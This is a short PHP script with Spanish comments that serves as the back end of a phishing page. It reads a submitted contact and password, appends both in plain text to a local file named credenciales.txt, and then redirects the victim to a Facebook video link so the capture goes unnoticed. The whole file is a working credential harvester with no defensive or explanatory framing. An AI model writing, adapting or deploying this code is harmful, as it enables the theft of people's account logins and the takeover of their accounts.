<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $contact = $_POST['contact'];
    $password = $_POST['password'];

    // Abre el archivo en modo de adición
    $file = fopen('credenciales.txt', 'a');

    // Verifica si el archivo se abrió correctamente
    if ($file) {
        // Escribe las credenciales en el archivo
        fwrite($file, "$contact:$password\n");
        // Cierra el archivo
        fclose($file);
        
        // Redirige a la página proporcionada
        header("Location: https://fb.watch/vc5CRZpvbs");
        exit(); // Asegúrate de detener la ejecución del script después de la redirección
    } else {
        echo "Error al abrir el archivo.";
    }
}
?>
